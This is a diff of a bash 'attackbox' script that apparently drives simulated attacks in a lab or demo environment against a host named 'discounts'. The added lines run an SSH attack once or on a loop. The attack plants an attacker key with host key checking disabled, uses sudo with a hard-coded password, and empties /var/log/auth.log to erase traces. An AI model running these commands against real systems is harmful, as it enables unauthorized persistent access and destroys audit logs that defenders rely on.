@@ -1,6 +1,9 @@
 #!/bin/bash
-echo "Starting attackbox..."
+echo "Starting attackbox...TEST!!!!!!!!"
 
+
+function ssh_attack()
+{
 echo "attempt to copy attacker key to discounts...."
 scp -o StrictHostKeyChecking=no ./keys/attacker-key.pub test@discounts:/home/test/.ssh
 
@@ -16,7 +19,28 @@ echo "test" | sudo -S cp /dev/null /var/log/auth.log
 echo "test" | sudo -S dd if=/dev/zero of=tempfile bs=1000000 count=10
 exit
 EOT
+}
 
+if [ "${ATTACK_SSH}" = 1 ];
+then
+  if [[ -z "${ATTACK_SSH_INTERVAL}" ]]
+    then
+      echo "SINGLE ATTACK"
+      # run single invocation
+      ssh_attack
+    else
+      echo "IN A LOOP"
+      # run in a loop
+      while true
+      do
+          echo "RUNNING SSH ATTACK"
+          ssh_attack
+          sleep $ATTACK_SSH_INTERVAL
+      done &
+  fi
+fi
+
+echo "*** ABOUT TO SLEEP FOR 15sec"
 # Add extra sleep to give frontend time to spin up (docker compose dependency is not enough)
 sleep 15
 
@@ -50,4 +74,5 @@ then
   fi
 fi
 
+sleep 3500
 echo "done"
